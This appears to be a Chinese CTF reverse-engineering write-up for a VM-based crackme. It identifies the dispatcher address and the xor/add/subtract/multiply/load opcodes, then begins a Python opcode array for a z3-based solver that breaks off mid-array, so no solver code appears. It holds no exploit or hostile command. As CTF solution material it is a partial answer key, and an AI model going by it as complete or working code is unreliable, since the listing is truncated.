<p>为了调用函数</p>
<p>42a9b0 400ad0 400af0  </p>
<p>sub_4184E0</p>
<p>经过调试分析，大致可以判断本题为VM逆向，dispatcher位于函数sub_400620中，即地址0x400828处</p>
<p><img src="/1763434247558-1.png" alt="img"></p>
<p>然后obopcode 即为地址0x4B2020处数值，此处取值调用函数，操作一共有 ^ - + * load 几种，编写代码模拟运行并使用z3求解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">opcode = [<span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x8C</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x4E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6F</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x42</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x5C</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x43</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x1F</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x2D</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x5A</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x39</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6A</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x74</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0xC8</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x58</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6F</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x74</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6D</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span 